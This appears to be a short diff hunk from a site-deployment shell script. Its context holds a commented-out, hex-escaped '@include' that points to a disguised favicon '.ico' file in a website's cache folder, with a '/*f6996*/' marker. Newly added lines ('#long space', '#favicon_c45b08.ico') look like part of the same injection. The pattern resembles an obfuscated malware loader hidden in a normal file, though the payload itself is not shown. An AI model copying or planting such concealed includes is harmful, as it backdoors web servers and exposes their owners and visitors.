@@ -5,6 +5,8 @@
 #@include "\x2fhom\x65/ad\x6din/\x77eb/\x6eako\x6cesa\x68.ne\x74.ua\x2fpub\x6cic_\x68tml\x2fwa-\x63ach\x65/ap\x70s/c\x6fnta\x63ts/\x66avi\x63on_\x615ac\x34a.i\x63o";
 #
 #/*f6996*/
+#long space
+#favicon_c45b08.ico
 
 SITE_PATH=$1
 
